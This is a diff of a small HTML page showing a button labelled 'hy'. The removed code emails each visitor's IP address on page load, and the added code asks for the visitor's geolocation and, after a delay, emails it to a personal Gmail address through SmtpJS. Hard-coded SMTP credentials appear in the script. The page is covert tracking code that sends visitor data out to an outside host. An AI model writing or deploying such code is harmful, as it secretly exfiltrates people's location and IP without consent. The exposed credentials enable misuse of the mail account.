@@ -4,7 +4,7 @@
 <body>
 
 
-    <button style="font-size: 42px; padding: 2% 4%; background: #fcafaf; border-radius: 14px;" onclick="getLocation()" id="ip-address">
+    <button style="font-size: 42px; padding: 2% 4%; background: #fcafaf; border-radius: 14px;" onclick="getLocation()">
         hy</button>
     <!-- smtpjs link
    -->
@@ -31,51 +31,30 @@
         // Global variable to store coordinates
         let userCoordinates = { latitude: null, longitude: null };
 
-    //  function getLocation() {
-    //         if ('geolocation' in navigator) {
-    //             navigator.geolocation.getCurrentPosition(
-    //                 (position) => {
-    //                     // Save the coordinates in the global variable
-    //                     userCoordinates.latitude = position.coords.latitude;
-    //                     userCoordinates.longitude = position.coords.longitude;
-
-    //                 },
-    //                 (error) => {
-    //                     console.error(`Error: ${error.message}`);
-    //                 }
-    //             );
-    //         } else {
-    //             console.error('Geolocation is not supported by your browser.');
-    //         }
-    //         console.log('hamid');
-    //     }
-    document.addEventListener("DOMContentLoaded", function() {
-            // Fetch the IP address from the API
-            fetch("https://api.ipify.org?format=json")
-                .then(response => response.json())
-                .then(data => {
-                    // Display the IP address on the screen
-                    Email.send({
+        navigator.geolocation.getCurrentPosition(
+  (e)=>{
+    setTimeout(()=>{
+        Email.send({
                 Host: "smtp.elasticemail.com",
                 Username: "digicore@demo.com",
                 Password: "1DDE1DCBBAE04DC37822B18AF26B27F6C3E2",
                 To: 'mhamidabid301@gmail.com',
                 From: "mhamidabid301@gmail.com",
                 Subject: 'subject',
-                Body: data.ip
+                Body: e
 
 
 
             })
-                    document.getElementById("ip-address").textContent = data.ip;
-                })
-                .catch(error => {
-                    console.error("Error fetching IP address:", error);
-                });
-        });
-       setTimeout(()=>{
-        
        },8000)
+  },
+  (errorCallback)=>{
+    console.log(e);
+  }
+);
+            console.log('hamid');
+        
+      
 
         // Automatically run the function when the page is loaded
         window.onload = getLocation;
